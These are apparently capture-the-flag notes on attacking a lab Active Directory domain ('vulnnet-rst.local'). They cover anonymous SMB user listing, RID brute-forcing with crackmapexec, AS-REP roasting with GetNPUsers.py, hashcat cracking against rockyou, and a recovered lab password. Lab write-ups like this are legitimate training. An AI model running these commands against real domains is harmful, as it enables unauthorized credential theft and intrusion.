### Enumeration
##### Anonymous SMB
__Usernames__
- Tony Skid
- Johnny Leet : 7331 0000 1337
- Jack Goldenhand
- Alexa Whitehat : 1337 0000 7331
- 
__Rid Bruteforce__
```bash
 crackmapexec smb $IP -u "x" -p "" --rid-brute
```

```txt
a-whitehat
t-skid
j-goldenhand
j-leet
```

##### AS-Rep Roasting
```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip $IP -usersfile users.txt
```

```bash
hashcat -m 18200 -a 0 hashes.txt ~/git/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --force -O
```
__password__
t-skid
```txt
tj072889*
```


